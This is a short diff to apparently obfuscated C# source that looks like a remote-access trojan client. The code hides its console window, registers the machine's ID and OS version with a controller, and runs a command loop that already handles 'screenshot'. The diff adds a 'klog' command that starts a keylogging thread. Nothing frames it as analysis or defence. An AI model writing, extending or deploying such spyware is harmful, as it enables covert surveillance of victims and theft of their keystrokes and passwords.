@@ -49,7 +49,7 @@ namespace VAR1
     {
         [DllImport("user32.dll")]
         static extern bool ShowWindow(IntPtr VAR102, UInt32 VAR101);
-        
+
         [DllImport("kernel32.dll")]
         static extern IntPtr GetConsoleWindow();
 
@@ -427,6 +427,7 @@ namespace VAR1
             string VAR19 = String.Format("register {0} {1}", VAR8, VAR20());
             VAR11 = Environment.OSVersion.ToString();
             VAR21(VAR19, null);
+
             while (!VAR18)
             {
                 try
@@ -449,6 +450,10 @@ namespace VAR1
                         else if (VAR26[0].Equals("screenshot"))
                         {
                             VAR204();
+                        }
+                        else if (VAR26[0].Equals("klog")){
+                          Thread VAR103 = new Thread(() => VAR104());
+                          VAR103.Start();
                         }
                         else
                         {
